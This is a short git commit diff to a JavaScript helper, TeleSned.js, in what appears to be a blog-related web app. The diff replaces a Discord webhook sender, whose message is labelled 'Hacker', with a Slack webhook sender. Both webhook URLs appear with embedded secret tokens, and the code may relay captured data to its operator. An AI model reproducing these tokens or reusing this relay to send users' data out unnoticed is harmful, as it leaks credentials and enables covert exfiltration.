bfe3e8dc908363e4653475104af992206f04fd82
Aabwshmys <aabwshmys84@gmail.com>
2024-12-30 23:02:39 +0300

    Update TeleSned.js

--- ‏‏my-app/src/server/TeleSned.js
+++ ‏‏my-app/src/server/TeleSned.js
@@ -2,22 +2,16 @@ import axios from 'axios';
 
 
 export const TeleSned = () => {
-
+    
     const Send = async (des) => {
-        const body = {
-          content: "Hacker",
-          tts: false,
-          color: "white",
-          embeds: [
-            {
-              title: " مدونة سمسا ",
-              description: des,
-           },
-          ],
-    };
-            
-        await axios.post("https://discord.com/api/webhooks/1318990970519294004/Hzl6uJu85D2gLpdtbFMp-EheGuoJAdQRKR9WA85g41JoQM1umjxCikAFoivixRjADhJ5",body)
-             
+        const text = `مدونة سمسا %0A ${des}`;
+        await axios.post(`https://hooks.slack.com/services/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`,JSON.stringify(text),{
+            withCredentials:false,
+            transformRequest:[(data,headers) =>{
+                delete headers.post["Content-Type"]
+                return text
+            }]
+        })
     }
   return {
     Send,
